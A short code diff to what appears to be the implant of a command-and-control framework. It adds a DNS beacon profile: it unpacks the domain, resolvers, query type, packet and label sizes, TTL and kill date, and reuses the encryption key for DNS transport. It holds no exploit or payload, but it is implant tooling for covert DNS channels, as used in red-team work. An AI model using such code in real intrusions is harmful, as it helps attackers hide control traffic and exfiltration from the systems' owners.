@@ -64,6 +64,25 @@ AgentConfig::AgentConfig()
 	this->sleep_delay     = 0;
 	this->jitter_delay    = 0;
 
+#elif defined(BEACON_DNS)
+	// DNS beacon profile layout is packed on the Go side in pl_agent.go
+	// case "dns" as:
+	// [agent_type, domain, resolvers, qtype, pkt_size, label_size, ttl, listener_type, kill_date]
+	// Here we unpack in the same order and populate ProfileDNS.
+	this->profile.domain      = packer->UnpackBytesCopy(&length);
+	this->profile.resolvers   = packer->UnpackBytesCopy(&length);
+	this->profile.qtype       = packer->UnpackBytesCopy(&length);
+	this->profile.pkt_size    = packer->Unpack32();
+	this->profile.label_size  = packer->Unpack32();
+	this->profile.ttl         = packer->Unpack32();
+	// reuse global encrypt_key as DNS transport key
+	this->profile.encrypt_key = this->encrypt_key;
+	this->listener_type       = packer->Unpack32();
+	this->kill_date           = packer->Unpack32();
+	this->working_time        = 0;
+	this->sleep_delay         = 0;
+	this->jitter_delay        = 0;
+
 #endif
 
 	this->download_chunk_size = 0x19000;
